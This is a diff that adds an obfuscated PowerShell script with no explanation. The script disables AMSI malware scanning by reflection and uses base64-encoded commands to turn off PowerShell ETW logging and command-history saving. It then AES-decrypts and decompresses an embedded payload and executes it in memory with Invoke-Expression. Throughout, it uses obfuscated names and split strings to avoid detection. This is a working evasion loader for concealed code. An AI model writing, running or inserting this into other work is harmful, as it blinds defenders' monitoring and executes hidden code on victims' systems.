@@ -1,0 +1,29 @@
+$jb42nN = "System.Management.Automation.A";$y5xj5wf = "Utils";$MNPNLdt2zF = "si"
+$hMA8JcHNCb = [Ref].Assembly.GetType(($jb42nN+"m"+$MNPNLdt2zF+$y5xj5wf));$6no9="Failed"
+$KIiqFde3os = $hMA8JcHNCb.GetField(("am"+$MNPNLdt2zF+"Init"+$6no9),"NonPublic,Static")
+$KIiqFde3os.SetValue($null,$true)
+$Ko95z = "R5cGUoJ1N5c3RlbS5NYW5hJysnZ2VtZW50LkF1dG8nKydtYXRpb24uVHJhY2luZy5QU0V0Jysnd0xvZ1ByJysnb3ZpZGVyJykuR0V0RmllTEQoJ2V0Jysnd1Byb3YnKydpZGVyJywnTm9uUCcrJ3VibGljLFN0YXRpYycpLkdlVFZhTHVlKCRudWxsKSwwKQ=="
+$E11dMjskEC = "W1JlZmxlQ3RpT04uQXNzRU1ibHldOjpMT0FkV2l0aFBBUnRpYWxOYU1lKCdTeXN0ZW0uQ29yZScpLkdlVFRZUGUoJ1N5c3QnKydlbS5EaWFnbicrJ29zdGljcy5FdmUnKydudGluZy5FdmVuJysndFByb3ZpZGVyJykuR2V0RmllbGQoJ21fZW5hYmxlZCcsJ05vblB1YmxpYyxJbnN0YW5jZScpLlNldFZhbHVlKFtSZWZdLkFzU0VtYkxZLkdldF"
+$cLMG2 = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($E11dMjskEC+$Ko95z)))
+iN'v'Oke-exPReS'S'iOn($cLMG2)
+$9vjt7ypGyxe = "U2V0LVBTUmVBZExJbmVPcFRpb24g"
+$ce7eJuPCm = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($9vjt7ypGyxe+"LUhpc3RvcnlTYXZlU3R5bGUgU2F2J2VOJ290aCdpbidn")))
+iN'v'Oke-exPReS'S'iOn($ce7eJuPCm)
+$imNu = [System.Convert]::FromBase64String("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")
+$sJ69 = New-Object "System.Security.Cryptography.AesManaged"
+$KnKwM5n61k = [System.Convert]::FromBase64String("v7u3shgoYalOQ9/jzwgYW72z97XN17evNXY1CnRnUS4=")
+$sJ69.Mode = [System.Security.Cryptography.CipherMode]::CBC
+$sJ69.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+$sJ69.IV = $imNu[0..15]
+$sJ69.BlockSize = 128
+$sJ69.KeySize = 256
+$sJ69.Key = $KnKwM5n61k
+$10nuc31 = New-Object System.IO.MemoryStream(,$sJ69.CreateDecryptor().TransformFinalBlock($imNu,16,$imNu.Length-16))
+$Gz68kID = New-Object System.IO.MemoryStream
+$3c6bCDc = New-Object System.IO.Compression.GzipStream $10nuc31, ([IO.Compression.CompressionMode]::Decompress)
+$3c6bCDc.CopyTo($Gz68kID)
+$sJ69.Dispose()
+$3c6bCDc.Close()
+$qII6 = [System.Text.Encoding]::UTF8.GetString($Gz68kID.ToArray())
+$10nuc31.Close()
+IEX($qII6)
